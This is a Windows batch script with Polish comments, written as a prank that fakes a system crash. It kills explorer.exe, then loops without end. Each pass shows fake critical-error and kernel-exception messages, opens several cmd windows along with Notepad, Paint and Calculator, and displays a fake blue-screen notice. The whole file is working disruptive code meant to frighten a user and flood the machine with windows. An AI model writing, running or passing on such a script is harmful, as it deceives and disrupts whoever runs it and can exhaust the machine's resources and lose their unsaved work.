@echo off
title System Failure
color 0A
mode 1000
cls

:: Ukrycie paska Start
taskkill /f /im explorer.exe

:: Pętla chaosu
:start
color %random%
msg * "CRITICAL ERROR: 0x%random%%random%"
msg * "System Failure! Memory Overload!"
msg * "Unexpected Kernel Exception!"

:: Otwieranie losowych okien CMD
start cmd
start cmd
start cmd

:: Otwieranie programów systemowych (dla efektu chaosu)
start notepad
start mspaint
start calc

:: Fałszywy BSOD (z niebieskim ekranem)
echo Your PC ran into a problem and needs to restart. > bsod.txt
color 1F
type bsod.txt
timeout /t 5 >nul
del bsod.txt

goto start